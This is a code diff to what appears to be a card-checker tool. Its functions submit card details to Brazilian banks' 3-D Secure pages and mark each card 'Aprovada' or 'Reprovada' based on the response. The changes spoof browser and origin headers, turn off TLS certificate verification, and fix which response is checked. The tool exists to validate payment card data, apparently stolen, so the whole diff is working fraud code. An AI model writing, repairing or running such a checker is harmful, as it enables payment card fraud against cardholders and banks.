@@ -44,7 +44,7 @@ export async function checker_bb(card_params) {
             responseType: 'text',
             resolveBodyOnly: true
         });
-
+        
         const html = load(req);
         const value_pareq = html('[name="PaReq"]').attr('value');
         const value_md = html('[name="MD"]').attr('value');
@@ -83,22 +83,22 @@ export async function checker_bb(card_params) {
         }
     } catch (error) {
         if (error.code == 'ERR_NON_2XX_3XX_RESPONSE') {
-            const req_tree = await client(error.options.url, {
-                https: {
-                    rejectUnauthorized: false
-                }
-            });
-            const req_for = await client(`${secureUrl}/customer.bb`, {
-                responseType: 'text',
+            const req_tree = await client(`${secureUrl}/customer.bb`, {
+                headers: {
+                    'Host': c_url,
+                    'Origin': `https://${c_url}`,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
+                },
                 https: {
                     rejectUnauthorized: false
                 },
+                responseType: 'text',
                 resolveBodyOnly: true
             });
-            if (req_for.includes('Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute') == true) {
+            if (req_tree.includes('Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute') == true) {
                 return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ CLEAN 3ds</font>`;
             }
-            if (req_for.includes('Selecione um celular para receber') == true) {
+            if (req_tree.includes('Selecione um celular para receber') == true) {
                 return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ SMS</font>`;
             } else {
                 return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
@@ -178,7 +178,7 @@ export async function checker_sicredi(card_params) {
             responseType: 'text',
             resolveBodyOnly: true
         });
-
+        
         const html2 = load(req_two);
         const redirect = html2('[name="redirectForm"]').attr('action');
         const IdSession = html2('[name="IdSession"]').attr('value');
